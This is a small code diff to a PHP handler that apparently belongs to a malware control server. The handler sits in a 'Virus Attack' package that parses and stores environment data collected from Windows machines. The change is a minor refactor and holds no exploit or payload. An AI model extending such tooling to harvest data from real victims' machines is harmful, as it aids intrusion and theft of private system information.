@@ -1,9 +1,8 @@
 <?php
 
-use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv\CollectEnv;
 use function Kelvinho\Virus\filter;
 
-/** @var CollectEnv $this */
+/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv\CollectEnv $this */
 
 $lines = filter(explode("\n", $this->requestData->fileCheck("envFile")), fn($line) => !empty(trim($line)));
 $data = [];
@@ -14,4 +13,3 @@ foreach ($lines as $line) {
 
 $this->setEnv($data);
 $this->setExecuted();
-$this->saveState();
